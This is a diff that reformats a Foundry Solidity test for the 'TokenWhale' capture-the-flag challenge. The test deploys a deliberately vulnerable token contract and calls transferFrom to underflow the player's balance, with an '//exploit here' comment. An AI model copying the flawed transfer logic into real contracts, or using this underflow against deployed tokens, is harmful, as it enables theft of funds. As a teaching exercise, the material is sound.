@@ -4,27 +4,38 @@ pragma solidity ^0.7.6;
 import "forge-std/Test.sol";
 
 contract ContractTest is Test {
-        TokenWhaleChallenge TokenWhaleChallengeContract;
- 
+    TokenWhaleChallenge TokenWhaleChallengeContract;
 
-function testOverflow2() public {
-    address alice = vm.addr(1);
-    address bob = vm.addr(2);
+    function testOverflow2() public {
+        address alice = vm.addr(1);
+        address bob = vm.addr(2);
 
-    TokenWhaleChallengeContract = new TokenWhaleChallenge();   
-    TokenWhaleChallengeContract.TokenWhaleDeploy(address(this));
-    console.log("Player balance:",TokenWhaleChallengeContract.balanceOf(address(this)));
-    TokenWhaleChallengeContract.transfer(address(alice),800);
+        TokenWhaleChallengeContract = new TokenWhaleChallenge();
+        TokenWhaleChallengeContract.TokenWhaleDeploy(address(this));
+        console.log(
+            "Player balance:",
+            TokenWhaleChallengeContract.balanceOf(address(this))
+        );
+        TokenWhaleChallengeContract.transfer(address(alice), 800);
 
-    vm.prank(alice);   
-    TokenWhaleChallengeContract.approve(address(this),1000);
-    TokenWhaleChallengeContract.transferFrom(address(alice),address(bob),500); //exploit here
+        vm.prank(alice);
+        TokenWhaleChallengeContract.approve(address(this), 1000);
+        TokenWhaleChallengeContract.transferFrom(
+            address(alice),
+            address(bob),
+            500
+        ); //exploit here
 
-    console.log("Exploit completed, balance overflowed");
-    console.log("Player balance:",TokenWhaleChallengeContract.balanceOf(address(this)));
+        console.log("Exploit completed, balance overflowed");
+        console.log(
+            "Player balance:",
+            TokenWhaleChallengeContract.balanceOf(address(this))
+        );
     }
-    receive() payable external{}
+
+    receive() external payable {}
 }
+
 contract TokenWhaleChallenge {
     address player;
 
@@ -62,14 +73,22 @@ contract TokenWhaleChallenge {
         _transfer(to, value);
     }
 
-    event Approval(address indexed owner, address indexed spender, uint256 value);
+    event Approval(
+        address indexed owner,
+        address indexed spender,
+        uint256 value
+    );
 
     function approve(address spender, uint256 value) public {
         allowance[msg.sender][spender] = value;
         emit Approval(msg.sender, spender, value);
     }
 
-    function transferFrom(address from, address to, uint256 value) public {
+    function transferFrom(
+        address from,
+        address to,
+        uint256 value
+    ) public {
         require(balanceOf[from] >= value);
         require(balanceOf[to] + value >= balanceOf[to]);
         require(allowance[from][msg.sender] >= value);
